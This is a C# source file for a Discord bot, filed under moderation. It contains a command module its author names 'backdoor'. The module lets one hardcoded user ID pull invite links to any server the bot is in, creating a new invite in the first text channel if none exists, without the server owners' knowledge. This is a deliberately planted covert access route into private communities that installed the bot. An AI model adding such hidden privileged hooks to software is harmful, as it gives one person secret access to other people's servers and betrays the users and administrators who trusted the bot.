using System;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;

using Discord;
using Discord.Commands;
using Discord.WebSocket;

namespace BunnyBot.Core.Moderation
{
    public class backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("invite"), Summary("Get the invite of a server")]
        public async Task invite(ulong GuildId)
        {
            if (!(Context.User.Id == 208412033748566016))
            {
                await Context.Channel.SendMessageAsync(":x: You are not a bot moderator!");
                return;
            }

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id=" + GuildId);
                return;
            }

            SocketGuild guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();

            try
            {
                var invites = await guild.GetInvitesAsync();
                if (invites.Count() < 1)
                {
                    await guild.TextChannels.First().CreateInviteAsync();
                }

                invites = null;
                invites = await guild.GetInvitesAsync();
                EmbedBuilder embed = new EmbedBuilder();
                embed.WithAuthor($"Invites for guild {guild.Name}", guild.IconUrl);
                embed.WithColor(40, 200, 150);
                foreach (var current in invites)
                    embed.AddInlineField("Invite:", $"[Invite]({current.Url})");

                await Context.Channel.SendMessageAsync("", false, embed.Build());
            }
            catch (Exception ex)
            {
                await Context.Channel.SendMessageAsync($":x: Createing an invite for guild {guild.Name} failed with error ``{ex.Message}``");
                return;
            }
        }
    }
}
